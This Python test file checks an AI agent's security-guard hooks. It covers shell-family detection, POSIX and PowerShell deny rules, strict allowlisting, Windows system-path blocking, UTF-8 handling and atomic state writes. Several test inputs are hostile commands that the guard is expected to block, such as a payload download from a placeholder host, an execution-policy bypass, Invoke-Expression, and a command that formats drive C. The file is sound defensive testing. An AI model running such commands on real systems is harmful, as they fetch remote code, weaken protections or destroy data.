"""Cross-platform guarantees for the hook layer.

Covers the three risk classes from the 2026-07 portability audit:

1. Non-ASCII content in telemetry/hook payloads (cp1252-proofing)
2. Concurrent state writes (atomic tempfile + os.replace)
3. Shell-family security validation (POSIX vs PowerShell vs unknown)

These tests run on the ubuntu/macos/windows CI matrix
(.github/workflows/cross-platform.yml) — keep them free of
POSIX-only assumptions.

Copyright 2026 Smart-AI-Memory
Licensed under Apache 2.0
"""

from __future__ import annotations

import importlib
import json
import subprocess
import sys
import threading
from pathlib import Path

import pytest

from attune.hooks.scripts.security_guard import (
    POSIX_DENY_PATTERNS,
    POWERSHELL_DENY_PATTERNS,
    STRICT_ALLOWED_FIRST_TOKENS,
    detect_shell_family,
    validate_file_path,
    validate_shell_command,
)

SCRIPTS_DIR = Path(__file__).resolve().parents[3] / "src" / "attune" / "hooks" / "scripts"

NON_ASCII_COMMAND = "echo 'café — naïve 日本語 🎉'"


# ---------------------------------------------------------------------------
# 1. Shell-family validation
# ---------------------------------------------------------------------------


class TestShellFamilyDetection:
    def test_explicit_powershell_tool_name(self) -> None:
        assert detect_shell_family({"tool_name": "PowerShell"}) == "powershell"

    def test_pwsh_shell_field(self) -> None:
        assert detect_shell_family({"shell": "pwsh"}) == "powershell"

    def test_bash_on_posix_is_posix(self) -> None:
        if sys.platform == "win32":
            pytest.skip("posix-host assertion")
        assert detect_shell_family({"tool_name": "Bash"}) == "posix"


class TestPosixFamily:
    def test_allows_plain_command(self) -> None:
        allowed, _ = validate_shell_command("ls -la", family="posix")
        assert allowed

    def test_blocks_eval(self) -> None:
        allowed, reason = validate_shell_command("python -c 'eval(x)'", family="posix")
        assert not allowed
        assert "eval()" in reason

    def test_non_ascii_command_is_handled(self) -> None:
        allowed, _ = validate_shell_command(NON_ASCII_COMMAND, family="posix")
        assert allowed


class TestPowershellFamily:
    def test_blocks_invoke_expression(self) -> None:
        allowed, reason = validate_shell_command(
            "Invoke-Expression $payload", family="powershell"
        )
        assert not allowed
        assert "Invoke-Expression" in reason

    def test_blocks_set_execution_policy(self) -> None:
        allowed, _ = validate_shell_command(
            "Set-ExecutionPolicy Bypass -Scope Process", family="powershell"
        )
        assert not allowed

    def test_blocks_download_pipe(self) -> None:
        allowed, _ = validate_shell_command(
            "iwr https://x.example/payload.ps1 | select -First 1",
            family="powershell",
        )
        assert not allowed

    def test_fails_closed_on_unknown_command(self) -> None:
        allowed, reason = validate_shell_command(
            "Format-Volume -DriveLetter C", family="powershell"
        )
        assert not allowed
        assert "strict mode" in reason

    def test_allowlisted_commands_pass(self) -> None:
        allowed, _ = validate_shell_command(
            "git status; python -m pytest", family="powershell"
        )
        assert allowed

    def test_disallowed_segment_behind_allowed_prefix_is_blocked(self) -> None:
        allowed, _ = validate_shell_command(
            "git status; Format-Volume -DriveLetter C", family="powershell"
        )
        assert not allowed

    def test_posix_denies_also_apply(self) -> None:
        allowed, _ = validate_shell_command("python -c 'eval(x)'", family="powershell")
        assert not allowed


class TestUnknownFamilyIsStrict:
    def test_unknown_family_uses_strict_mode(self) -> None:
        allowed, reason = validate_shell_command("mystery-binary --flag", family="unknown")
        assert not allowed
        assert "strict mode" in reason

    def test_unknown_family_allows_allowlisted(self) -> None:
        allowed, _ = validate_shell_command("python -m pytest", family="unknown")
        assert allowed


class TestDenySetHygiene:
    def test_deny_sets_are_disjoint_objects(self) -> None:
        assert POSIX_DENY_PATTERNS is not POWERSHELL_DENY_PATTERNS

    def test_allowlist_is_lowercase(self) -> None:
        assert all(t == t.lower() for t in STRICT_ALLOWED_FIRST_TOKENS)


class TestWindowsPathBlocking:
    @pytest.mark.parametrize(
        "path",
        [
            "C:\\Windows\\system32\\evil.dll",
            "c:/windows/system32/evil.dll",
            "C:\\Program Files\\App\\x.exe",
        ],
    )
    def test_blocks_windows_system_dirs(self, path: str) -> None:
        allowed, reason = validate_file_path(path)
        assert not allowed
        assert "system directory" in reason

    def test_allows_windows_user_paths(self) -> None:
        allowed, _ = validate_file_path("C:\\Users\\dev\\project\\file.py")
        assert allowed


# ---------------------------------------------------------------------------
# 2. Non-ASCII payloads through the real script processes
# ---------------------------------------------------------------------------


class TestNonAsciiEndToEnd:
    """Run the actual hook scripts as subprocesses with UTF-8 payloads."""

    def _run(self, script: str, payload: dict) -> subprocess.CompletedProcess[bytes]:
        return subprocess.run(  # noqa: S603
            [sys.executable, str(SCRIPTS_DIR / script)],
            input=json.dumps(payload).encode("utf-8"),
            capture_output=True,
            timeout=15,
        )

    def test_security_guard_allows_non_ascii_safe_command(self) -> None:
        result = self._run(
            "security_guard.py",
            {"tool_name": "Bash", "tool_input": {"command": NON_ASCII_COMMAND}},
        )
        assert result.returncode == 0, result.stderr

    def test_security_guard_blocks_eval_in_non_ascii_command(self) -> None:
        result = self._run(
            "security_guard.py",
            {"tool_name": "Bash", "tool_input": {"command": "café; eval(x)"}},
        )
        assert result.returncode == 2

    def test_telemetry_hook_accepts_non_ascii(self) -> None:
        result = self._run(
            "telemetry_hook.py",
            {"tool_name": "Bash", "tool_input": {"command": NON_ASCII_COMMAND}},
        )
        assert result.returncode == 0, result.stderr


# ---------------------------------------------------------------------------
# 3. Concurrent, atomic state writes
# ---------------------------------------------------------------------------


class TestAtomicStateWrites:
    def test_concurrent_saves_never_yield_partial_json(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        suggest_compact = importlib.import_module(
            "attune.hooks.scripts.suggest_compact"
        )

        state_file = tmp_path / "compaction_state.json"
        monkeypatch.setattr(
            suggest_compact, "get_compaction_state_file", lambda: state_file
        )

        errors: list[Exception] = []
        stop = threading.Event()

        def writer(n: int) -> None:
            payload = {"tool_call_count": n, "data": "célébration 🎉" * 50}
            try:
                for _ in range(25):
                    suggest_compact.save_compaction_state(payload)
            except Exception as exc:  # noqa: BLE001
                errors.append(exc)

        def reader() -> None:
            while not stop.is_set():
                if state_file.exists():
                    try:
                        json.loads(state_file.read_text(encoding="utf-8"))
                    except json.JSONDecodeError as exc:
                        errors.append(exc)

        threads = [threading.Thread(target=writer, args=(i,)) for i in range(4)]
        observer = threading.Thread(target=reader)
        observer.start()
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        stop.set()
        observer.join()

        assert not errors, f"partial/failed writes observed: {errors[:3]}"
        final = json.loads(state_file.read_text(encoding="utf-8"))
        assert "célébration" in final["data"]

    def test_no_leftover_tempfiles_on_success(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        suggest_compact = importlib.import_module(
            "attune.hooks.scripts.suggest_compact"
        )

        state_file = tmp_path / "state.json"
        monkeypatch.setattr(
            suggest_compact, "get_compaction_state_file", lambda: state_file
        )
        suggest_compact.save_compaction_state({"tool_call_count": 1})
        leftovers = [p for p in tmp_path.iterdir() if p.name != "state.json"]
        assert leftovers == []

    def test_roundtrip_preserves_non_ascii(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        suggest_compact = importlib.import_module(
            "attune.hooks.scripts.suggest_compact"
        )

        state_file = tmp_path / "state.json"
        monkeypatch.setattr(
            suggest_compact, "get_compaction_state_file", lambda: state_file
        )
        suggest_compact.save_compaction_state({"note": "naïve — 日本語 🎉"})
        loaded = suggest_compact.load_compaction_state()
        assert loaded["note"] == "naïve — 日本語 🎉"
